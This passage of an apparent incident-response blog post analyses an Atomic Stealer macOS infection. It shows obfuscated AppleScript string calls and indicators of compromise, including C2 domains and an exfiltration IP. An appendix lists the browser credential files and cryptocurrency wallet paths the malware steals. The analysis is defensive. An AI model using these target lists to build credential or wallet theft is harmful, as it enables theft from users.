+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;        dummy_var &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;return&lt;/span&gt; out
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our malware makes these calls all over the place and takes advantage of the fact that AppleScript makes strings executable
+via e.g. &lt;code&gt;shell script (cdftjcxbo({305, 186, 278, 283, 321, 88, 117, 167, 240}, {196, 79, 178, 178, 207, 56, 72, 55, 208}))&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s an example call:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-AppleScript&#34; data-lang=&#34;AppleScript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;    {&lt;span style=&#34;color:#40a070&#34;&gt;198&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;168&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;242&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;142&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;163&lt;/span&gt;}, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;    {&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;78&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;135&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;96&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;92&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;129&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This returns a fragmented string of &lt;code&gt;&amp;quot;etamask.io\\\&amp;quot;:\\\&amp;quot;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Doing this exhaustively for all the strings in the &lt;em&gt;massive&lt;/em&gt; malware script feels like a Herculean task. Luckily for us,
+defenders get to play with LLMs too. Claude Opus 4.6 whipped up a Python tool that extracted all the strings and then
+helpfully categorized them into a breakdown (included below in &lt;a href=&#34;#appendix-a-what-was-taken&#34;&gt;Appendix A&lt;/a&gt;). This gave us a good
+way to assess the full blast radius of this incident, even if the full blast radius was horrifying.&lt;/p&gt;
+&lt;h1 id=&#34;going-atomic&#34; &gt;Going Atomic
+&lt;span&gt;
+    &lt;a href=&#34;#going-atomic&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Doing some digging post-incident, I discovered that this appears to be a particular strain of well-known malware &lt;a href=&#34;https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis&#34;&gt;Atomic Stealer&lt;/a&gt;. There have been various iterations of this going back to 2023,
+but the gist of it is this:&lt;/p&gt;
+&lt;p&gt;Atomic Stealer (also referred to as AMOS - Atomic macOS Stealer) is marketed on Telegram as a Malware-as-a-Service platform, with costs ranging from $1000-$3000 a month. Users get access
+to various binaries as well as a dashboard system to monitor logs and stolen info, but C2 and distribution are up to them.&lt;/p&gt;
+&lt;p&gt;Persistence is (relatively) new to AMOS, and previous variants were largely smash-and-grab to avoid triggering system notifications
+when new login items are added.&lt;/p&gt;
+&lt;p&gt;Research by other more official firms and not just Some Dude like me shows that this a growing attack vector:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.darktrace.com/blog/atomic-stealer-darktraces-investigation-of-a-growing-macos-threat&#34;&gt;Darktrace research&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.sentinelone.com/blog/atomic-stealer-threat-actor-spawns-second-variant-of-macos-malware-sold-on-telegram/&#34;&gt;SentinelOne&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis&#34;&gt;Picus Security&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Additionally, there are lots of links for further reading over at &lt;a href=&#34;https://malpedia.caad.fkie.fraunhofer.de/details/osx.amos&#34;&gt;malpedia&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;indicators-of-compromise&#34; &gt;Indicators of Compromise
+&lt;span&gt;
+    &lt;a href=&#34;#indicators-of-compromise&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;This is almost certainly an AMOS affiliate campaign - I&amp;rsquo;m not certain that both instances I&amp;rsquo;ve seen were actually the same campaign since we halted
+execution in one case, but the successful execution made references to a campaign ID of &lt;code&gt;wusetail.com&lt;/code&gt;, and had &lt;code&gt;avipstudios.com&lt;/code&gt; as a fallback
+C2 domain. Data exfiltration happened to &lt;code&gt;38.244.158.103&lt;/code&gt; which is located in the Netherlands.&lt;/p&gt;
+&lt;p&gt;Darktrace&amp;rsquo;s research also noted an IP located in the Netherlands but on a different ASN. What was the same was the exfiltration path of &lt;code&gt;/api/tasks/&amp;lt;base64 string&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since this is a fairly &amp;ldquo;standard&amp;rdquo; malware, most EDR vendors should have good IOCs in general here.&lt;/p&gt;
+&lt;h1 id=&#34;lessons-learned&#34; &gt;Lessons Learned
+&lt;span&gt;
+    &lt;a href=&#34;#lessons-learned&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Overall, this was not nearly as bad as it could have been. While this was an early-stage startup where
+things are typically pretty Wild West, they had overall good practices that really reduced the impact:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The engineer in question didn&amp;rsquo;t have direct, persistent access to customer data.&lt;/li&gt;
+&lt;li&gt;They had a comprehensive list of systems the employee could access, which meant suspending accounts was easy.&lt;/li&gt;
+&lt;li&gt;2FA on everything and a password manager (beyond the built in browser one) limited stolen credential impact.&lt;/li&gt;
+&lt;li&gt;EDR did identify this in short order, even if it didn&amp;rsquo;t halt execution. This could have gone on for a &lt;em&gt;long&lt;/em&gt; time otherwise.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Incident response plans should assume this kind of compromise is a &amp;ldquo;when&amp;rdquo; not &amp;ldquo;if&amp;rdquo; question, and you should build out your
+IAM and monitoring strategies accordingly.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;And for goodness sake please stop piping &lt;code&gt;curl&lt;/code&gt; into &lt;code&gt;bash&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;appendix-a-what-was-taken&#34; &gt;Appendix A: What Was Taken
+&lt;span&gt;
+    &lt;a href=&#34;#appendix-a-what-was-taken&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;h3 id=&#34;browser-data-chromium-based&#34; &gt;Browser Data (Chromium-based)
+&lt;span&gt;
+    &lt;a href=&#34;#browser-data-chromium-based&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;The malware targets &lt;strong&gt;12 Chromium-based browsers&lt;/strong&gt;, stealing the following files from each profile:&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;File&lt;/th&gt;
+          &lt;th&gt;Contents&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/Cookies&lt;/code&gt; and &lt;code&gt;/Network/Cookies&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Session cookies, authentication tokens&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/Login Data&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Saved usernames and passwords&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/Web Data&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Autofill data, saved credit cards&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/Local Extension Settings/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Extension data (targeted by extension ID)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/IndexedDB/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Extension databases&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/Local Storage/leveldb/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Extension local storage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/History&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Browsing history (conditional)&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;Targeted Chromium browsers:&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Browser&lt;/th&gt;
+          &lt;th&gt;Profile Path&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Chrome&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Google/Chrome/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Brave&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;BraveSoftware/Brave-Browser/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Microsoft Edge&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Microsoft Edge/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Vivaldi&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Vivaldi/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Opera&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;com.operasoftware.Opera/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Opera GX&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;com.operasoftware.OperaGX/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Chrome Beta&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Google/Chrome Beta/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Chrome Canary&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Google/Chrome Canary&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Chrome Dev&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Google/Chrome Dev/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Chromium&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Chromium/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Arc&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Arc/User Data/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;CocCoc&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;CocCoc/Browser/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;browser-data-firefox-based&#34; &gt;Browser Data (Firefox-based)
+&lt;span&gt;
+    &lt;a href=&#34;#browser-data-firefox-based&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;For Firefox and Waterfox, it steals:&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;File&lt;/th&gt;
+          &lt;th&gt;Contents&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/cookies.sqlite&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Cookies&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/formhistory.sqlite&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Form autofill history&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/key4.db&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Encryption keys for saved passwords&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/logins.json&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Encrypted saved passwords&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/places.sqlite&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Bookmarks and history (conditional)&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;It also specifically searches Firefox profiles for the &lt;strong&gt;MetaMask&lt;/strong&gt; extension (&lt;code&gt;webextension@metamask.io&lt;/code&gt;) and copies its IDB storage if found.&lt;/p&gt;
+&lt;h3 id=&#34;targeted-browser-extension-ids-321-total&#34; &gt;Targeted Browser Extension IDs (321 total)
+&lt;span&gt;
+    &lt;a href=&#34;#targeted-browser-extension-ids-321-total&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;xsaqtqzhnj&lt;/code&gt; property contains &lt;strong&gt;321 Chrome extension IDs&lt;/strong&gt;. When found in a browser profile&amp;rsquo;s &lt;code&gt;Local Extension Settings&lt;/code&gt; or &lt;code&gt;IndexedDB&lt;/code&gt; directories, their data is exfiltrated. These are almost certainly &lt;strong&gt;cryptocurrency wallet extensions&lt;/strong&gt;, including but not limited to MetaMask and similar wallet/DeFi extensions. The malware checks for these extension IDs across all Chromium browser profiles.&lt;/p&gt;
+&lt;h3 id=&#34;cryptocurrency-wallet-applications&#34; &gt;Cryptocurrency Wallet Applications
+&lt;span&gt;
+    &lt;a href=&#34;#cryptocurrency-wallet-applications&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;The malware specifically targets standalone wallet applications:&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Wallet&lt;/th&gt;
+          &lt;th&gt;Path Stolen&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Electrum&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/.electrum/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Coinomi&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Coinomi/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Exodus&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Exodus/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Atomic Wallet&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;atomic/Local Storage/leveldb/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Wasabi Wallet&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/.walletwasabi/client/Wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Ledger Live&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Ledger Live/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Monero&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/Monero/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Bitcoin Core&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Bitcoin/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Litecoin Core&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Litecoin/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Dash Core&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;DashCore/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Electrum-LTC&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/.electrum-ltc/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Electron Cash&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/.electron-cash/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Guarda&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Guarda/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Dogecoin Core&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Dogecoin/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Trezor Suite&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;@trezor/suite-desktop/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Sparrow&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;~/.sparrow/wallets/&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;hardware-wallet-application-data&#34; &gt;Hardware Wallet Application Data
+&lt;span&gt;
+    &lt;a href=&#34;#hardware-wallet-application-data&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;The malware checks if these apps are installed and extracts their application data:&lt;/p&gt;
+&lt;ul&gt;
